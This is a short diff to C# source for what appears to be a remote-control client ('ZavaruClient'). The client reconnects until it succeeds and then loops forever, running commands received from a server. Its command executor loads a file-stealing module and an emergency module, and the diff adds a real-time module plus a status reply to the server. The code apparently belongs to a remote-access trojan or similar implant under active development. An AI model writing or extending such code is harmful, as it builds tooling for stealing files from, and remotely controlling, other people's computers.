@@ -64,11 +64,14 @@ async Task<ZavaruClient> ConnectUntilSuccessAsync()
 var commandExecutor = new CommandExecutor()
                       .AddModule<ExampleModule>()
                       .AddModule<FileStealerModule>()
-                      .AddModule<EmergencyModule>();
+                      .AddModule<EmergencyModule>()
+                      .AddModule<RealTimeModule>();
 
 var client = await ConnectUntilSuccessAsync();
 while (true)
 {
+    Debug.WriteLine("Waiting for command...");
+
     Command? command = null;
     try
     {
@@ -92,6 +95,16 @@ while (true)
         }
 
         continue;
+    }
+
+    var isRealTime = commandExecutor.IsRealTime(command);
+
+    if (isRealTime)
+    {
+        await client.SendAsync(new CommandResult
+        {
+            Status = CommandResultStatus.RealTime
+        });
     }
 
     var result = await commandExecutor.ExecuteAsync(command, client);
